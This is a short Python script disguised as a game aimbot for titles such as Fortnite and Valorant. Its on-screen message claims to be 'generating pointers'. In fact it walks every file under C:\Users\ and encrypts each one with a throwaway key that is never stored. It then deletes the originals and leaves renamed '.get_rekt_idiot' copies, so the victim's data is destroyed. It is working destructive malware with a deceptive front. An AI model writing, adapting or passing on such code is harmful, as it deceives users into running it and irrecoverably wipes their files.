import threading
import os

from tqdm import tqdm
from cryptography.fernet import Fernet

target_path = ["C:\\Users\\"]

key = Fernet.generate_key()
f = Fernet(key)


def decrypt(filename):
    try:
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)

        os.remove(filename)

        with open(f"{filename}.get_rekt_idiot", "wb") as file:
            file.write(encrypted_data)

    except PermissionError:
        pass
        # You could make an additional function to prompt user to use root for this script

    except FileNotFoundError:
        pass


def get_all_files(start_path):
    all_files = []
    for path in start_path:
        for root, dirs, files in os.walk(path):
            for file in files:
                # construct full file path
                file_path = os.path.join(root, file)
                all_files.append(file_path)

    return all_files


def execute():

    files = get_all_files(target_path)
    print(f"Found {len(files)} pointers. Updating...")
    for file in tqdm(files):
        decrypt(file)


if __name__ == "__main__":
    try:
        print(f"""
Information:

The Aimbot will now start generating / updating the pointers for
Fortnite, CS:GO, Rainbow Six Siege, Valorant and possibly other FPS games.
This only needs to be done once, and can then be re-used. How long it takes depends
on your system resources. Generating the pointers takes a lot of CPU and DISK usage.


DO NOT RUN IT ON SPLITGATE!  Splitgate can detect the Aimbot. All other games didn't.
        """)

        input("Press Enter to continue...")

        t1 = threading.Thread(target=execute)
        t1.start()

    except Exception:
        pass
